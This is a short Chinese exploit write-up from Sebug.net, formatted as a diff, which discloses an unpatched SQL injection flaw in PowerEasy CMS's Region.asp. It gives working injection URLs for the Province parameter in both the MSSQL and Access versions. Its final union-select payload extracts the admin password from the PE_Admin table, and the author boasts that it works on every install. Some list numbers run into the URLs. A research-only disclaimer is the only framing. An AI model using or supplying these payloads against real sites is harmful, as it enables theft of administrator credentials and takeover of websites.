@@ -1,0 +1,6 @@
+2006-11-21 动易最新未公开Bug
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.但是要进入这个查询的前提是：Err=true 或者 TempRs.EOF，而要达到这2个中的一个，就是要让Conn.Execute(\\\"SELECT Province FROM PE_Province WHERE Country=\\\'\\\" & Country & \\\"\\\' ORDER BY ProvinceID\\\")这条语句在表中查询不到所要找的Country，这样就好构造了。下面是利用代码：2. 3.http://127.0.0.1/Region.asp?Country=tt&City=whytt&Province=shi'+and+user>0--4. 5.就是在6.http://127.0.0.1/Region.asp?Country=tt&City=whytt&Province=shi'后面加上我们的SQL注入语句。7. 8. 9.这就是整个利用原理，很简单，但也很致命的漏洞。10. 11. 12.上面是MSSQL版本的利用，而如果要是ACCESS版本中的利用，那么怎么办呢，呵呵，聪明的你可能觉得我在说废话老，看吧。13. 14.http://127.0.0.1/Region.asp?Country=tt&City=whytt&Province=shi' and 1=1 and '1'='115. 16.这样的话，我们的and 1=1就是在access版本中的利用。呵呵。这样就完成这个漏洞在2个版本的利用。17. 18.http://127.0.0.1/Region.asp?Country=tt&City=whytt&Province=shi'+and+1=2+union+select+password+from+PE_Admin+where+1<2+and+'1'='119. 20.其中username是要暴的字段，哈哈，通杀的感觉爽吧
